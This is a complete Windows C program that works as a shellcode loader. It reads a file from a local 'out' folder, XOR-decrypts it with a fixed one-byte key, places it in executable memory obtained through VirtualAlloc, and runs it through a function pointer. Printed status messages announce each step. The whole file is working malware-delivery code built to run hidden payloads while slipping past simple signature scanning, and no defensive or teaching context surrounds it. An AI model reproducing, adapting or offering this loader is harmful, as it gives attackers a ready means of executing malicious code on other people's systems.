#include <windows.h>
#include <stdio.h>

#pragma GCC optimize("O0")

void xor_decrypt(unsigned char* data, unsigned int size, unsigned char key) {
    for (unsigned int i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

int main(int argc, char* argv[]) {

    const unsigned char xorKey = 0xAA;

    char basePath[] = ".\\out\\";
    char filename[MAX_PATH] = "output.bin";

    if (argc > 1) {
        strncpy(filename, argv[1], MAX_PATH - 1);
        filename[MAX_PATH - 1] = '\0';
    }

    char fullPath[MAX_PATH];
    snprintf(fullPath, MAX_PATH, "%s%s", basePath, filename);

    HANDLE hFile = CreateFileA(
        fullPath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open %s (Error: %lu)\n", fullPath, GetLastError());
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("[-] GetFileSize failed (Error: %lu)\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    LPVOID shellcode = VirtualAlloc(
        NULL,
        fileSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!shellcode) {
        printf("[-] VirtualAlloc failed (Error: %lu)\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, shellcode, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[-] ReadFile failed (Error: %lu)\n", GetLastError());
        VirtualFree(shellcode, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return 1;
    }

    CloseHandle(hFile);

    printf("[+] Decrypting shellcode (%lu bytes)...\n", fileSize);
    xor_decrypt((unsigned char*)shellcode, fileSize, xorKey);

    FlushInstructionCache(GetCurrentProcess(), shellcode, fileSize);

    printf("[+] Executing shellcode at %p...\n", shellcode);

    void (*func)() = (void(*)())shellcode;
    func();

    VirtualFree(shellcode, 0, MEM_RELEASE);

    printf("[+] Done\n");
    return 0;
}